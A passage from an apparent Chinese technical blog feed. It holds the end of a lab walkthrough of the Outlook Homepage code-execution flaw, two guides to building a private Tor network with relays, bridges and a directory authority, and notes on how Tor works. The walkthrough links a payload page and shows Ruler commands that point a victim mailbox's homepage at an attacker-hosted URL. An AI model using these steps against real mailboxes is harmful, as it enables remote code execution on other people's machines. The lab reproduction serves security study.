target="_blank" rel="noopener">crazy@contoso.com</a></p><p><img src="/2018/05/30/Outlook Homepage Vulner/new-mailbox.JPG" alt="new-mailbox"></p><p>会自动创建域用户 crazy</p><p><img src="/2018/05/30/Outlook Homepage Vulner/new-mailbox2.JPG" alt="new-mailbox"></p><p>登陆 </p><pre><code>https://localhost/owa/auth/logon.aspx?replaceCurrent=1&amp;reason=2&amp;url=https%3a%2f%2flocalhost%2fecp%2f</code></pre><p>==&gt; ok</p><h2 id="0x02-windows上新建一个mailbox"><a href="#0x02-windows上新建一个mailbox" class="headerlink" title="0x02 windows上新建一个mailbox"></a>0x02 windows上新建一个mailbox</h2><p>填入邮箱及密码<br><img src="/2018/05/30/Outlook Homepage Vulner/add-mail.JPG" alt="add-mail"></p><h2 id="0x03-触发homepage漏洞"><a href="#0x03-触发homepage漏洞" class="headerlink" title="0x03 触发homepage漏洞"></a>0x03 触发homepage漏洞</h2><pre><code>打开 crazy 邮箱 (outlook )-&gt; 点击 inbox 并右键 Data File Properties   -&gt; 写入 homepage内容 [outlookHomepageRCE](https://gist.githubusercontent.com/staaldraad/c7b857e9bd6fd332f6f1bd01a2160266/raw/16fb7bb5aac443f4541dd0557062445d128b9813/outlookHomepageRCE.html)    -&gt; crazy@corp.contoso.com ( 点击 inbox 弹出 notepad )</code></pre><p><img src="/2018/05/30/Outlook Homepage Vulner/homepage1.JPG" alt="homepage"></p><p>当然也可使用工具 Ruler ( kali )</p><pre><code>/usr/local/go/bin/go run ruler.go -k --email crazy@corp.contoso.com -u crazy homepage add --url http://10.1.0.166/1.htmlPassword: [+] Retrieving MAPI/HTTP info[+] Binding to RPC[+] Creating new endpoint[+] Verifying...[+] New endpoint set[+] Trying to force trigger/usr/local/go/bin/go run ruler.go -k --email crazy@corp.contoso.com -u crazy homepage displayPassword: [+] Retrieving MAPI/HTTP info[+] Binding to RPC[+] Getting existing endpoint[+] Found endpoint: http://10.1.0.166/1.html[+] Webview is set as ENABLED</code></pre><p><img src="/2018/05/30/Outlook Homepage Vulner/homepage3.JPG" alt="kali-homepage"></p><p>通过这个漏洞,可以执行命令…</p><h2 id="0x04-还有恶意规则漏洞-Ruler工具"><a href="#0x04-还有恶意规则漏洞-Ruler工具" class="headerlink" title="0x04 还有恶意规则漏洞 (Ruler工具)"></a>0x04 还有恶意规则漏洞 (Ruler工具)</h2><pre><code>/usr/local/go/bin/go run ruler.go -k --email crazy@corp.contoso.com -u crazy display    Password:     [+] Retrieving MAPI/HTTP info    [+] Binding to RPC    [+] Retrieving Rules    [+] No Rules Found</code></pre><h2 id="0x05-注"><a href="#0x05-注" class="headerlink" title="0x05 注"></a>0x05 注</h2><pre><code>此漏洞要知道邮箱账号密码此漏洞只针对未打补丁的outlook客户端 ( Outlook 2010 SP2, Outlook 2013 SP1 and RT SP1, and Outlook 2016 )</code></pre><h2 id="0x06-Reference"><a href="#0x06-Reference" class="headerlink" title="0x06 Reference"></a>0x06 Reference</h2><pre><code>https://github.com/sensepost/ruler/wiki/Ruleshttps://sensepost.com/blog/2017/outlook-home-page-another-ruler-vector/ </code></pre>]]></content>
      
      <categories>
          
          <category> 技术相关 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记 </tag>
            
            <tag> 漏洞 </tag>
            
            <tag> Outlook homepage </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>搭建私有Tor网络</title>
      <link href="/2018/04/11/%E6%90%AD%E5%BB%BA%E7%A7%81%E6%9C%89Tor%E7%BD%91%E7%BB%9C/"/>
      <url>/2018/04/11/%E6%90%AD%E5%BB%BA%E7%A7%81%E6%9C%89Tor%E7%BD%91%E7%BB%9C/</url>
      <content type="html"><![CDATA[<h2 id="0x00-搭建私有Tor网络-private-Tor-network"><a href="#0x00-搭建私有Tor网络-private-Tor-network" class="headerlink" title="0x00 搭建私有Tor网络 ( private Tor network)"></a>0x00 搭建私有Tor网络 ( private Tor network)</h2><p>RS1 ： Tor Client (客户端)    </p><p>RS2 ： Tor relay    (退出及中继节点)    2个中继+1退出中继</p><p>RS3 ： Tor Bridge relay    (网桥)    </p><p>RS4 ： Authority Server (权威目录服务器)</p><a id="more"></a><p>权威服务器(Authority Server)必须和洋葱路由器(Tor)在同一时间</p><pre><code>apt-get install tor ntpdate ntpdate time.nist.gov </code></pre><h2 id="0x01-配置权威目录服务器RS4-Setup-Authority-Server-on-RS4"><a href="#0x01-配置权威目录服务器RS4-Setup-Authority-Server-on-RS4" class="headerlink" title="0x01 配置权威目录服务器RS4(Setup Authority Server on RS4)"></a>0x01 配置权威目录服务器RS4(Setup Authority Server on RS4)</h2><p>(1). 运行以下命令生成的权威密钥(authority keys)</p><p>mkdir /var/lib/tor/keys</p><pre><code>sudo tor-gencert --create-identity-key -m 12 -a 192.168.18.111:7000 \            -i /var/lib/tor/keys/authority_identity_key \            -s /var/lib/tor/keys/authority_signing_key \            -c /var/lib/tor/keys/authority_certificate </code></pre><p>or ===&gt; </p><pre><code>sudo tor-gencert --create-identity-key -m 12 -a 192.168.18.111:7000 -i /var/lib/tor/keys/authority_identity_key -s /var/lib/tor/keys/authority_signing_key -c /var/lib/tor/keys/authority_certificate  -v</code></pre><p>当提示输入密码，请使用你的密码 dfgt@#dfd34341sd~~!。该命令将生成以下文件</p><pre><code>authority_identity_key ：长期密钥签署授权证书(authority certificate)authority_signing_key ：中期键(medium-term key)(3-12个月)签署目录信息authority_certificate ：由权威身份密钥(authority identity key)签名的文件，以证明权威签名密钥。</code></pre><p>(2). 其次，生成router keys</p><p><a href="https://tor.stackexchange.com/questions/8873/creating-directory-server" target="_blank" rel="noopener">https://tor.stackexchange.com/questions/8873/creating-directory-server</a><br><a href="http://fengy.me/prog/2015/01/09/private-tor-network/" target="_blank" rel="noopener">http://fengy.me/prog/2015/01/09/private-tor-network/</a></p><pre><code>tor --list-fingerprint --orport 1 \--dirserver &quot;name 127.0.0.1:1 ffffffffffffffffffffffffffffffffffffffff&quot; \--datadirectory /var/lib/tor</code></pre><p>or ==&gt;</p><pre><code>sudo tor --list-fingerprint --orport 1 --dirserver &quot;name 127.0.0.1:1 ffffffffffffffffffffffffffffffffffffffff&quot; --datadirectory /var/lib/tor/(if permission denied : sudo chown -R root:root /var/lib/tor)</code></pre><p>该命令将生成以下文件：</p><pre><code>secret_id_key ：长期密钥来签署路由器描述符和TLS证书。secret_onion_key ：用于建立一个电路和协商临时密钥中期关键。secret_onion_key_ntor ：握手短期关键(short-term key for handshake.)。fingerprint : fingerprint of the identity key.</code></pre><p>(3) 编辑torrc<br>gedit /etc/tor/torrc </p><pre><code>TestingTorNetwork 1DataDirectory /var/lib/torRunAsDaemon 1ConnLimit 60Nickname RS4ShutdownWaitLength 0PidFile /var/lib/tor/pidLog notice file /var/lib/tor/notice.logLog info file /var/lib/tor/info.logProtocolWarnings 1SafeLogging 0DisableDebuggerAttachment 0DirAuthority RS4 orport=5000 v3ident=finger1 192.168.18.111:7000 finger2SocksPort 0OrPort 5000Address 192.168.18.111DirPort 7000# An exit policy that allows exiting to IPv4 LAN#ExitPolicy accept 192.168.16.0/22:*# An exit policy that allows exiting to IPv6 localhost#ExitPolicy accept [::1]:*#IPv6Exit 1AuthoritativeDirectory 1V3AuthoritativeDirectory 1ContactInfo auth@test.testExitPolicy reject *:*</code></pre><p>service tor start</p><p>finger1 : /var/lib/tor/keys/authority_certificate 找到 fingerprint 9F891F74141865DD89F1EB7D1C5853AB6188D041</p><p>finger2 : /var/lib/tor/fingerprint </p><pre><code>eg. Your Tor server&#39;s identity key fingerprint is &#39;Unnamed C78C7376A09461466F95C56E36199148058FBF84&#39;===&gt; finger2 = C78C 7376 A094 6146 6F95 C56E 3619 9148 058F BF84</code></pre><h2 id="0x02-配置客户端-Tor-Client"><a href="#0x02-配置客户端-Tor-Client" class="headerlink" title="0x02 配置客户端(Tor Client)"></a>0x02 配置客户端(Tor Client)</h2><p>(1) 生成router keys</p><pre><code>tor --list-fingerprint --orport 1 \    --dirserver &quot;x 127.0.0.1:1 ffffffffffffffffffffffffffffffffffffffff&quot; \    --datadirectory /var/lib/tor</code></pre><p>(2) 编辑torrc </p><p>gedit /etc/tor/torrc </p><pre><code>OrPort 5000SocksPort 9011Exitpolicy reject *:*        Nickname RS1DirAuthority RS4 orport=5000 v3ident=finger1 192.168.1.4:7000 finger2 #(finger1 and finger2 in RS4)TestingTorNetwork 1DataDirectory /var/lib/torRunAsDaemon 1ConnLimit 60ShutdownWaitLength 0PidFile /var/lib/tor/pidLog notice file /var/lib/tor/notice.logLog info file /var/lib/tor/info.logProtocolWarnings 1SafeLogging 0DisableDebuggerAttachment 0</code></pre><p>service tor start</p><h2 id="0x03-配置中继和退出节点-以及网桥"><a href="#0x03-配置中继和退出节点-以及网桥" class="headerlink" title="0x03 配置中继和退出节点(以及网桥)"></a>0x03 配置中继和退出节点(以及网桥)</h2><h3 id="配置中继节点-Tor-Relay-s"><a href="#配置中继节点-Tor-Relay-s" class="headerlink" title="配置中继节点 Tor Relay (s)"></a>配置中继节点 Tor Relay (s)</h3><p>(1) 生成router keys</p><pre><code>tor --list-fingerprint --orport 1 \    --dirserver &quot;x 127.0.0.1:1 ffffffffffffffffffffffffffffffffffffffff&quot; \    --datadirectory /var/lib/tor</code></pre><p>(2) 编辑torrc </p><p>gedit /etc/tor/torrc </p><pre><code>OrPort 5000SocksPort 0                    #RS1 diffrentExitpolicy reject *:*        Nickname RS2DirAuthority RS4 orport=5000 v3ident=finger1 192.168.1.4:7000 finger2 #(finger1 and finger2 in RS4)TestingTorNetwork 1DataDirectory /var/lib/torRunAsDaemon 1ConnLimit 60Nickname RS1ShutdownWaitLength 0PidFile /var/lib/tor/pidLog notice file /var/lib/tor/notice.logLog info file /var/lib/tor/info.logProtocolWarnings 1SafeLogging 0DisableDebuggerAttachment 0# An exit policy that allows exiting to IPv4 LANExitPolicy accept 192.168.16.0/22:*# An exit policy that allows exiting to IPv6 localhostExitPolicy accept [::1]:*IPv6Exit 1</code></pre><p>service tor start</p><h3 id="Tor-Relay-s-配置退出中继节点"><a href="#Tor-Relay-s-配置退出中继节点" class="headerlink" title="Tor Relay (s)配置退出中继节点"></a>Tor Relay (s)配置退出中继节点</h3><p>只是在”Tor Relay (s)配置中继 “ 配置文件中加一个：</p><pre><code>ExitRelay 1</code></pre><h2 id="0x04-配置网桥-Bridge-relay"><a href="#0x04-配置网桥-Bridge-relay" class="headerlink" title="0x04 配置网桥 Bridge relay"></a>0x04 配置网桥 Bridge relay</h2><p>Ubuntu</p><p>must have External IP </p><p>apt-get install obfs4proxy</p><p>gedit /etc/tor/torrc   </p><pre><code>SOCKSPort 0                     ORPort 5000                ExtORPort autoBridgeRelay 1UpdateBridgesFromAuthority 1    ServerTransportPlugin obfs4 exec /usr/bin/obfs4proxy   Exitpolicy reject *:*            RunAsDaemon 1PublishServerDescriptor 0        Nickname RS3ContactInfo test@test.test DirAuthority RS4 orport=5000 v3ident=finger1 192.168.1.4:7000 finger2 #(finger1 and finger2 in RS4)</code></pre><p>service tor start</p><p>sudo cat /var/lib/tor/fingerprint</p><h2 id="0x05-使用网桥-UseBridges"><a href="#0x05-使用网桥-UseBridges" class="headerlink" title="0x05 使用网桥 UseBridges"></a>0x05 使用网桥 UseBridges</h2><pre><code>UseBridges 1Bridge obfs4 89.46.73.150:41595 BE158D7939B8C95C54F07C50D7EBE50BEDA68C4D cert=3OCxcKIP+9UmUUVJPgjArM95dpZUDJv6+uFR35KlKy6JzkxbN3llrvE1jNzhFPWaX2mgZw iat-mode=0Bridge obfs4 13.58.94.90:9443 DDAFCB98850DE23177224F382049A6FCD4A80E4B cert=MvzYIjUby2RfVa5ATIKkf1bC3lQ4JSzzmWtHCDcKZaCxByn4Tp5R30bMiMnOEXrKPP8qeA iat-mode=0Bridge obfs4 83.212.97.47:54187 80FCA5A349AE7E5C2C8503BFB908D4204FDB9C3E cert=IfdoBRxcIl/l5YrMUxFrNSOOI5DjU3w8IcZI/CQMbpzBj/UdpdCZsT5yfbZ1MFL6xmTTGw iat-mode=0ClientTransportPlugin obfs4 exec /usr/bin/obfs4proxyMaxCircuitDirtiness 600    # 600 seconds = 10 minutes</code></pre><p>firefox : socks5 —&gt; 127.0.0.1 9050</p><h2 id="0x06-Test-The-Private-Network"><a href="#0x06-Test-The-Private-Network" class="headerlink" title="0x06 Test The Private Network"></a>0x06 Test The Private Network</h2><p>在RS1，设置火狐为”127.0.0.1:9011” SOCKS5<br>Wireshark来观看每RS1访问<a href="http://192.168.1.4" target="_blank" rel="noopener">http://192.168.1.4</a></p><h2 id="0x07-Reference"><a href="#0x07-Reference" class="headerlink" title="0x07 Reference"></a>0x07 Reference</h2><pre><code>https://www.torproject.org/docs/tor-manual-dev.html.enhttps://ritter.vg/blog-run_your_own_tor_network.htmlhttp://fengy.me/prog/2015/01/09/private-tor-network/</code></pre><p>写于 : 2017-10-30 16:09:00</p>]]></content>
      
      <categories>
          
          <category> 技术相关 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记 </tag>
            
            <tag> Tor </tag>
            
            <tag> 网桥 </tag>
            
            <tag> 中继 </tag>
            
            <tag> 权威目录服务器 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Tor技术相关</title>
      <link href="/2018/04/07/Tor%E6%8A%80%E6%9C%AF%E7%9B%B8%E5%85%B3/"/>
      <url>/2018/04/07/Tor%E6%8A%80%E6%9C%AF%E7%9B%B8%E5%85%B3/</url>
      <content type="html"><![CDATA[<h2 id="0x01-Tor的工作原理"><a href="#0x01-Tor的工作原理" class="headerlink" title="0x01 Tor的工作原理"></a>0x01 Tor的工作原理</h2><p>基于TCP连接的匿名通信系统,它可以用于网页浏览、即时消息等通信。</p><p>它首先从目录服务器(Directory Server,DS)中获得所有Tor节点信息,然后在Tor节点集合中随机选取一个节点,与它协商密钥,最后与它建立一个安全信道。</p><a id="more"></a><h2 id="0x02-Tor-技术相关"><a href="#0x02-Tor-技术相关" class="headerlink" title="0x02 Tor 技术相关"></a>0x02 Tor 技术相关</h2><h3 id="目录服务器-Directory-Server"><a href="#目录服务器-Directory-Server" class="headerlink" title="目录服务器(Directory Server)"></a>目录服务器(Directory Server)</h3><pre><code>存放Tor 节点的列表</code></pre><h4 id="无网桥"><a href="#无网桥" class="headerlink" title="无网桥"></a>无网桥</h4><pre><code>1. 本地Tor客户端A从目录服务器Directory Server获取Tor受信节点机器列表 2. 本地Tor客户端A挑选随机3条加密节点访问B(web)  (当经过一段时间后,tor将重新为你的访问建立一条线路访问B(web))</code></pre><h3 id="网桥-Bridge-relays-Bridges"><a href="#网桥-Bridge-relays-Bridges" class="headerlink" title="网桥(Bridge relays / Bridges)"></a>网桥(Bridge relays / Bridges)</h3><pre><code>中继节点都是通过从目录服务器或者目录镜像得到,GFW只需把中继节点IP加入黑名单即可网桥方式或许可以绕过这种审查限制作为本地网和Tor网络之间的支持物,Tor 中继节点,用于帮助用户绕过审查或封锁。</code></pre><h4 id="有网桥"><a href="#有网桥" class="headerlink" title="有网桥"></a>有网桥</h4><pre><code>1. 本地Tor客户端A连接网桥 (从获取bridges.torproject.org或者搭建)2. 本地Tor客户端A通过网桥从目录服务器Directory Server获取Tor受信节点机器列表 3. 本地Tor客户端A通过网桥挑选随机3条加密节点访问B(web)本地 -&gt; Bridges -&gt; Directory Server (3 encrypted nodes) -&gt; web</code></pre><h3 id="Bridges-和-Relay-有啥区别"><a href="#Bridges-和-Relay-有啥区别" class="headerlink" title="Bridges 和 Relay 有啥区别?"></a>Bridges 和 Relay 有啥区别?</h3><pre><code>(1). Tor 的节点分两种 :    1. 第一种是中继节点,而中继节点又分两种：        Tor Relay 中继 - 需要加入 Directory ,GFW 是通过流量特征屏蔽 Tor,但作为第一跳的 IP 还是可能会被探测屏蔽。        Tor Bridges 网桥(Bridge relays) - tor 的网桥是一种特殊的中转节点。            它跟其它中转节点的差异在于：普通的中转节点,其信息会被加入到 TOR 在全球的目录服务器(Directory server),            所以普通的中转节点会被所有的人看到,并用来进行流量中转。            而你自己搭建的网桥,其信息不会被加入到全球的目录服务器——只会被你自己所用。            除了使用桥梁作为其第一跳,用户还可以使用它们来获取 directory 更新        他们配置都差不多的,取决于你是否公开。(https://www.torproject.org/docs/faq.html.en#RelayOrBridge)        (Being a normal relay vs being a bridge relay is almost the same configuration: it&#39;s just a matter of whether your relay is listed publicly or not.)        2. 出口节点(Exit Nodes),所谓蜜罐也都是部署在出口节点上的。        出口节点以外的访问的目标网站如果不是 SSL,那么从出口到目标网站就是明文的,会暴露 DNS 记录和明文密码。(2). 避免蜜罐节点    如果你使用的线路中,出口节点正好是蜜罐,那么该蜜罐就会窥探到你的上网行为,    并且,假如你访问的目标网站没有 HTTPS 加密,蜜罐就会知道你浏览的页面内容。    修改 TOR 的配置文件,规避这些不安全国家的节点。。    在该文件末尾,加入下面这行(ExcludeNodes 表示排除这些国家/地区的节点,StrictNodes 表示强制执行)。        ExcludeNodes {cn},{hk},{mo},{kp},{ir},{sy},{pk},{cu},{vn}        StrictNodes 1        ExitNodes {us}#出口节点    关于 StrictNodes         如果不设置 StrictNodes 1,TOR 客户端首先也会规避 ExcludeNodes 列出的这些国家。但如果 TOR 客户端找不到可用的线路,就会去尝试位于排除列表中的节点。        如果设置了 StrictNodes 1,即使 TOR 客户端找不到可用的线路,也不会去尝试这些国家的节点。(3). 多重代理    TOR + 其它翻墙工具( VPN)    TOR 本身就是一个多重代理！既然这样,为啥还要拿 TOR 跟其它翻墙工具搭配捏?        ==&gt;主要因为 GFW 把全球大部分的 TOR 节点都进行了IP封锁</code></pre><p>DataDirectory /var/lib/tor</p><p>#此目录为tor主要的运行数据存放目录包括key文件等</p><h3 id="Tor的客户端是如何知道Tor网络中的中继节点有哪些的呢"><a href="#Tor的客户端是如何知道Tor网络中的中继节点有哪些的呢" class="headerlink" title="Tor的客户端是如何知道Tor网络中的中继节点有哪些的呢?"></a>Tor的客户端是如何知道Tor网络中的中继节点有哪些的呢?</h3><pre><code>这里有一个概念,叫目录服务器(Directory Server)。目前,官方的目录服务器一共有9台,它们之间会定期同步数据。如果想成为中继节点,Tor客户端必须要向其中一台目录服务器注册自己。而且Tor的客户端是不用直接连接到官方的目录服务器来获得所有的中继节点信息的,而是通过所谓的目录镜像(Directory Mirror)。这些目录镜像会定期的从官方的目录服务器上拷贝一份最新的数据。这样做的好处是分担了目录服务器的负担,事实上,大部分中继节点都被配置成了目录镜像。</code></pre><h3 id="如何使用自己的节点机器列表"><a href="#如何使用自己的节点机器列表" class="headerlink" title="如何使用自己的节点机器列表?"></a>如何使用自己的节点机器列表?</h3><p>要设置自己的Tor网络,您需要运行自己的authoritative directory servers,</p><p>并且必须配置客户端和中继(relays),以便他们了解您的directory servers,而不是默认的公用directory servers。</p><pre><code>1.搭建一个网桥(Bridge relays)2.搭建一个目录服务器Directory Server 3.搭建很多个中继节点(Relays Nodes)及出口节点(Exit Nodes)</code></pre><p>or </p><pre><code>1.搭建一个网桥权威(Bridge authorities)    #就像正常的v3目录权威(v3 directory authorities)2.搭建很多个中继节点(Relays Nodes)及出口节点(Exit Nodes) </code></pre><p>运行一个Tor中继只需满足以下几个条件：</p><pre><code>你的互联网连接的上下行带宽至少为20KB/S(而且在你电脑开机期间都要保证稳定的连接)。你的互联网连接必须拥有一个可以路由传送的公网IP地址。如果你的电脑处于网络地址转换( NAT )防火墙内,没有公网IP地址,你必须在路由器上设定端口映射规则。你可以借助Tor的通用即插即用设备完成这一步骤,也可以通过查看你的路由器使用说明,或者根据portforward.com(http://portforward.com/english/applications /port_forwarding/HTTPS/HTTPSindex.htm)上的说明手动设置它。</code></pre><p>非必需条件有：</p><pre><code>电脑不必一直开机联网(Tor目录会在开机并联网的时候设置好一切)。不是一个静态IP地址。</code></pre><p>小知识 ：<br>除了手动配置几个directory servers,relays和客户端之外,还有两个单独的工具可以帮助您。一个是Chutney,另一个是Shadow</p><pre><code>https://ritter.vg/blog-run_your_own_tor_network.htmlChutney和Shadow大多是专为在labratory条件下运行experiements建立测试网络工具.Shadow是专门为跨大型TOR网络运行带宽测试而设计的。所以,如果你想运行建模50000节点Tor网络-Shadow的你再合适不过了。Chutney 是一种配置工具,用于测试/控制/运行Tor网络.Shadow 是一个网络模拟器,可以通过其Scallion插件运行Tor    虽然它通常用于在基本上较大的Tor测试网络上运行负载和性能测试,而不是Chutney可行的测试网络,    但由于您可以运行完全确定性的实验,因此它也可以作为一个出色的调试工具    一个大型的Shadow网络有数千个Tor,Shadow可以在没有root的任何Linux机器上运行,也可以使用预配置的镜像EC2上运行Swarm - 简单的工具,用来管理Docker集群,它将一群Docker宿主机变成一个单一的/虚拟的主机.    一个swarm集群由很多个机器组成,不管是虚拟机还是物理机都可以。    最简单的方式就是执行docker swarm init来开启一个swarm节点,并且把当前执行命令的节点作为管理节点,    然后在其他机器上执行docker swarm join来加入这个swarm集群。stack - Docker层级关系中的最高一个层级</code></pre><h3 id="Configuring-a-Tor-relay-中继"><a href="#Configuring-a-Tor-relay-中继" class="headerlink" title="Configuring a Tor relay(中继)"></a>Configuring a Tor relay(中继)</h3><p><a href="https://www.torproject.org/docs/tor-doc-relay.html.en" target="_blank" rel="noopener">https://www.torproject.org/docs/tor-doc-relay.html.en</a><br><a href="https://www.torproject.org/docs/tor-relay-debian" target="_blank" rel="noopener">https://www.torproject.org/docs/tor-relay-debian</a><br><a href="https://www.torproject.org/docs/faq.html.en#ExitPolicies" target="_blank" rel="noopener">https://www.torproject.org/docs/faq.html.en#ExitPolicies</a></p><p>gedit /etc/tor/torrc ：</p><pre><code>ORPort 443Exitpolicy reject *:*        # avoid abuse, 此设置意味着您的中继将用于中继(relaying traffic)Tor网络中的流量,但不用于连接到外部网站或其他服务。Nickname ididntedittheconfigContactInfo human@...PublishServerDescriptor 0    # not publish anywhere, private relay#BridgeRelay 1              # only add this line if you want to be a bridgeFallbackDir ipv4address:port orport=port id=fingerprint [weight=num] [ipv6=[ipv6address]:orport]  #DirAuthority [nickname] [flags] ipv4address:port fingerprint   #公共中继默认为退出中继(exit node出口节点)(要么更改ExitPolicy行:Exitpolicy reject *:*)一旦您的中继设备连接到网络,它将尝试确定您配置的端口是否可从外部访问。这一步通常很快,但可能需要20分钟当您的中继确定可达时,它会将&quot;server descriptor&quot;上传到目录(directories)中,让客户端知道您的中继使用的地址,端口,密钥等。您可以搜索Atlas或Globe获取您配置的昵称</code></pre><hr><h3 id="Configuring-a-Tor-Bridge-relay-Bridges网桥"><a href="#Configuring-a-Tor-Bridge-relay-Bridges网桥" class="headerlink" title="Configuring a Tor Bridge relay(Bridges网桥)"></a>Configuring a Tor Bridge relay(Bridges网桥)</h3><p><a href="https://github.com/Yawning/obfs4" target="_blank" rel="noopener">https://github.com/Yawning/obfs4</a><br><a href="https://hub.docker.com/r/vimagick/tor/" target="_blank" rel="noopener">https://hub.docker.com/r/vimagick/tor/</a><br><a href="https://tor.stackexchange.com/questions/6370/how-to-run-an-obfs4-bridge" target="_blank" rel="noopener">https://tor.stackexchange.com/questions/6370/how-to-run-an-obfs4-bridge</a><br><a href="https://trac.torproject.org/projects/tor/wiki/doc/PluggableTransports/obfs4proxy" target="_blank" rel="noopener">https://trac.torproject.org/projects/tor/wiki/doc/PluggableTransports/obfs4proxy</a><br><a href="https://gitweb.torproject.org/torspec.git/tree/attic/bridges-spec.txt" target="_blank" rel="noopener">https://gitweb.torproject.org/torspec.git/tree/attic/bridges-spec.txt</a></p><p><strong>Ubuntu</strong><br><code>must have External IP</code> #如果你的电脑处于网络地址转换( NAT )防火墙内,没有公网IP地址,你必须在路由器上设定端口映射规则</p><p>apt-get install tor<br>apt-get install obfs4proxy</p><p>gedit /etc/tor/torrc   </p><pre><code>RunAsDaemon 1SOCKSPort 0                     #ORPort auto #9004                #定义一个ORPort ,不作为出口节点,设置成Bridge .ORPort default to 443 on Windows, and 9001 on other platforms.ExtORPort autoBridgeRelay 1UpdateBridgesFromAuthority 1    #尝试查询网络授权(the bridge authority), 建议桥梁用户始终设置UpdateBridgeFromAuthorityServerTransportPlugin obfs4 exec /usr/bin/obfs4proxy   Exitpolicy reject *:*            PublishServerDescriptor 0        #1 open Nickname Sp4rr0wContactInfo Sp4rr0w@Sp4rr0w.com </code></pre><p>sudo ls -al /var/lib/tor<br>sudo cat /var/lib/tor/fingerprint    #obfs4 CODE<br>sudo tail -F /var/log/tor/log        #日志文件 输出成功标志</p><p><a href="https://bridges.torproject.org/bridges?transport=obfs4" target="_blank" rel="noopener">https://bridges.torproject.org/bridges?transport=obfs4</a> :</p><pre><code>obfs4 104.236.237.76:9443 F68BBB77DA245790969057EE608E6B14283655EB cert=lxPxDTtghn56dGKbQ2vicevpXiUHNzJpSxCLMd76A8MhbKPVQqurd9Uf4sx7yOfYDA5dBw iat-mode=0obfs4 77.81.108.138:443 F4B33297F39EC5CF2EFD0E3D2F3EB87EC8428237 cert=Ax+LafRJEU1v5BGdXV0To86Vs+gr+EPbIvOZE3iL/fAY3pxScQppxW5y8e03DSCJuqZlCA iat-mode=0obfs4 104.153.209.217:21567 D28E0345809AE4BAC903EF7FC78CAAF111A63C58 cert=DtNNYXeRG4ds+iTM7sdbJHJgH7RmxDb1lt8JR17BiT7eHnORyn+4y+RcoqAI65XGvhXKJg iat-mode=0</code></pre><p><a href="https://www.torproject.org/docs/tor-manual-dev.html.en" target="_blank" rel="noopener">https://www.torproject.org/docs/tor-manual-dev.html.en</a></p><pre><code>-&gt; DirAuthority [nickname] [flags] address:port fingerprint  # DirServer replaced by DirAuthority如果没有给出 DirAuthority 行,Tor将使用默认目录权威(default directory authorities).注意：此选项用于使用自己的own directory authorities设置私有Tor网络。如果您使用它,您将与其他用户区分开来,因为您不会相信他们所做的相同的权限。</code></pre><p>架设隐藏服务,如Deep Web暗网：</p><pre><code>HiddenServiceDir /var/lib/tor/hidden_service/HiddenServicePort 80 127.0.0.1:80 #将访问的80端口定向到Nginx/Apache,Nginx监听127.0.0.1:80</code></pre><p>bridge descriptor ： by bridge -&gt; /tor/server/authority    or go to bridge authority and asking for “/tor/server/fp/ID</p><h3 id="Configuring-a-directory-authority"><a href="#Configuring-a-directory-authority" class="headerlink" title="Configuring a directory authority"></a>Configuring a directory authority</h3><p><a href="https://www.torproject.org/docs/tor-manual-dev.html.en" target="_blank" rel="noopener">https://www.torproject.org/docs/tor-manual-dev.html.en</a></p><p>gedit /etc/tor/torrc</p><pre><code>AuthoritativeDirectory 1     ##当此选项设置为1时,Tor将作为权威目录服务器运行V3AuthoritativeDirectory 1VersioningAuthoritativeDirectory 1RecommendedVersions STRING</code></pre><h3 id="Configuring-a-Bridge-authorities-or-v3-directory-authorities"><a href="#Configuring-a-Bridge-authorities-or-v3-directory-authorities" class="headerlink" title="Configuring a Bridge authorities (or v3 directory authorities"></a>Configuring a Bridge authorities (or v3 directory authorities</h3><p><a href="https://gitweb.torproject.org/torspec.git/tree/attic/bridges-spec.txt" target="_blank" rel="noopener">https://gitweb.torproject.org/torspec.git/tree/attic/bridges-spec.txt</a></p><p>Bridge authorities are like normal v3 directory authorities</p><p>网桥权威(Bridge authorities)就像正常的v3目录权威(v3 directory authorities)<br>become a bridge authority<br> -&gt; gedit /etc/tor/torrc  :</p><pre><code>AuthoritativeDirectory 1BridgeAuthoritativeDir 1</code></pre><h3 id="Centos7-setup-Bridge-relay-Bridges"><a href="#Centos7-setup-Bridge-relay-Bridges" class="headerlink" title="Centos7 setup Bridge relay(Bridges)"></a>Centos7 setup Bridge relay(Bridges)</h3><p>yum install tor -y</p><p>yum install git mercurial golang -y8t9xd4g</p><p>install obfs4proxy :</p><pre><code>export GOPATH=`mktemp -d`go get git.torproject.org/pluggable-transports/obfs4.git/obfs4proxycp $GOPATH/bin/obfs4proxy /usr/local/bin之后 ServerTransportPlugin obfs4 exec /usr/local/bin    #换一下就好</code></pre><h3 id="UseBridges"><a href="#UseBridges" class="headerlink" title="UseBridges"></a>UseBridges</h3><p>UseBridges 1</p><p>Bridge obfs4 192.168.18.111:9001 4D33C1FCB32E69093E36B8BAD53291A3E850C804</p><p>ClientTransportPlugin obfs4 exec /usr/bin/obfs4proxy</p><p>写于 : 2017-10-16 16:09:00</p><h2 id="0x03-Reference"><a href="#0x03-Reference" class="headerlink" title="0x03 Reference"></a>0x03 Reference</h2><pre><code>http://m.it610.com/article/3961692.htmhttp://www.haiyun.me/archives/1059.htmlhttps://program-think.blogspot.com/2013/11/tor-faq.htmlhttps://dreamcreator108.com/dreams/tor-bridge/index.htmlhttps://www.torproject.org/docs/running-a-mirror.html.enhttps://www.torproject.org/docs/tor-manual-dev.html.enhttps://github.com/Yawning/obfs4https://hub.docker.com/r/vimagick/tor/https://tor.stackexchange.com/questions/6370/how-to-run-an-obfs4-bridgehttps://trac.torproject.org/projects/tor/wiki/doc/PluggableTransports/obfs4proxy https://gitweb.torproject.org/torspec.git/tree/attic/bridges-spec.txthttps://www.torproject.org/docs/tor-doc-relay.html.enhttps://www.torproject.org/docs/tor-relay-debianhttps://www.torproject.org/docs/faq.html.en#ExitPolicies</code></pre>]]></content>
      
      <categories>
          
          <category> 技术相关 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记 </tag>
            
            <tag> Tor </tag>
            
            <tag> 网桥 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>批量导出ElasticSearch查询的结果</title>
      <link href="/2018/03/28/%E6%89%B9%E9%87%8F%E5%AF%BC%E5%87%BAElasticSearch%E6%9F%A5%E8%AF%A2%E7%9A%84%E7%BB%93%E6%9E%9C/"/>
